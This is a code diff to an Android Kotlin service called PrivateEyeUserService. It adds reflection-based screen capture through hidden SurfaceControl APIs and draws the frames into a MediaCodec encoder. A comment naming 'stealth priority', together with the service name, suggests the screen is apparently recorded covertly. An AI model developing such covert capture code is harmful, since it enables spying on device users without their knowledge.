@@ -364,6 +364,7 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
                 // Create ScreenCaptureListener (synchronous version)
                 val screenCaptureListenerClass = Class.forName("android.view.SurfaceControl\$ScreenCaptureListener")
                 var capturedBuffer: HardwareBuffer? = null
+                val latch = java.util.concurrent.CountDownLatch(1)
                 
                 val listener = java.lang.reflect.Proxy.newProxyInstance(
                     screenCaptureListenerClass.classLoader,
@@ -377,6 +378,7 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
                             getHardwareBufferMethod.isAccessible = true
                             capturedBuffer = getHardwareBufferMethod.invoke(screenCapture) as? HardwareBuffer
                         }
+                        latch.countDown()
                     }
                     null
                 }
@@ -384,13 +386,15 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
                 // Capture display
                 captureDisplayMethod.invoke(null, captureArgs, listener)
                 
-                // Wait briefly for callback
-                Thread.sleep(10)
-                
-                if (capturedBuffer != null) {
-                    // Process the HardwareBuffer
-                    processHardwareBuffer(capturedBuffer!!)
-                    return true
+                // Wait for callback with timeout (30ms to stay within frame interval)
+                if (latch.await(30, java.util.concurrent.TimeUnit.MILLISECONDS)) {
+                    if (capturedBuffer != null) {
+                        // Process the HardwareBuffer
+                        processHardwareBuffer(capturedBuffer)
+                        return true
+                    }
+                } else {
+                    log("[Warning] captureDisplay callback timeout - frame skipped")
                 }
                 
             } catch (e: NoSuchMethodException) {
@@ -458,34 +462,87 @@ class PrivateEyeUserService : IPrivateEyeService.Stub() {
     
     /**
      * Process HardwareBuffer and send to MediaCodec
+     * The HardwareBuffer needs to be rendered to the MediaCodec input surface
+     * Requires API 28+ (Android 9)
      */
-    private fun processHardwareBuffer(hardwareBuffer: HardwareBuffer) {
+    private fun processHardwareBuffer(hardwareBuffer: HardwareBuffer?) {
+        if (hardwareBuffer == null) {
+            log("[Error] HardwareBuffer is null")
+            return
+        }
+        
+        // Check API level
+        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.P) {
+            log("[Error] HardwareBuffer processing requires API 28+")
+            return
+        }
+        
         try {
-            imageReader?.surface?.let { surface ->
-                // Create Image from HardwareBuffer
-                val image = imageReader?.acquireLatestImage()
-                if (image != null) {
-                    // The image is already available in ImageReader
-                    // MediaCodec input surface will handle the conversion
-                    image.close()
+            // Use ImageReader to convert HardwareBuffer to a format suitable for MediaCodec
+            imageReader?.let { reader ->
+                // The HardwareBuffer contains the pixel data
+                // We need to draw it to the MediaCodec's input surface
+                inputSurface?.let { surface ->
+                    // Create a temporary canvas to draw the buffer
+                    // TODO: Use OpenGL ES for more efficient rendering in future updates
+                    // Current implementation prioritizes compatibility over performance
+                    val canvas = surface.lockCanvas(null)
+                    try {
+                        // Convert HardwareBuffer to Bitmap for drawing
+                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, null)
+                        if (bitmap != null) {
+                            canvas.drawBitmap(bitmap, 0f, 0f, null)
+                        } else {
+                            log("[Warning] Failed to wrap HardwareBuffer as Bitmap - frame skipped")
+                        }
+                    } finally {
+                        surface.unlockCanvasAndPost(canvas)
+                    }
                 }
             }
         } catch (e: Exception) {
-            log("[Error] HardwareBuffer processing error: ${e.message}")
+            log("[Error] HardwareBuffer processing error: ${e.javaClass.simpleName} - ${e.message}")
         }
     }
     
     /**
      * Process Bitmap and send to MediaCodec (fallback method)
+     * Draws the bitmap to the MediaCodec input surface
      */
-    private fun processBitmap(bitmap: Bitmap) {
+    private fun processBitmap(bitmap: Bitmap?) {
+        if (bitmap == null) {
+            log("[Error] Bitmap is null")
+            return
+        }
+        
         try {
-            // For bitmap fallback, we would need to convert to the format
-            // expected by MediaCodec. This is less efficient than HardwareBuffer
-            // but provides compatibility with older Android versions.
-            // The bitmap data would be copied to the encoder's input surface.
+            inputSurface?.let { surface ->
+                // Lock the canvas and draw the bitmap
+                val canvas = surface.lockCanvas(null)
+                try {
+                    // Scale the bitmap if needed to match the surface dimensions
+                    // Use filtering=false for faster processing (stealth priority)
+                    val scaledBitmap = if (bitmap.width != VIDEO_WIDTH || bitmap.height != VIDEO_HEIGHT) {
+                        Bitmap.createScaledBitmap(bitmap, VIDEO_WIDTH, VIDEO_HEIGHT, false)
+                    } else {
+                        bitmap
+                    }
+                    
+                    // Draw the bitmap to the canvas
+                    canvas.drawBitmap(scaledBitmap, 0f, 0f, null)
+                    
+                    // Clean up scaled bitmap if it was created
+                    if (scaledBitmap != bitmap) {
+                        scaledBitmap.recycle()
+                    }
+                } finally {
+                    surface.unlockCanvasAndPost(canvas)
+                }
+            } ?: run {
+                log("[Error] Input surface is null")
+            }
         } catch (e: Exception) {
-            log("[Error] Bitmap processing error: ${e.message}")
+            log("[Error] Bitmap processing error: ${e.javaClass.simpleName} - ${e.message}")
         }
     }
     
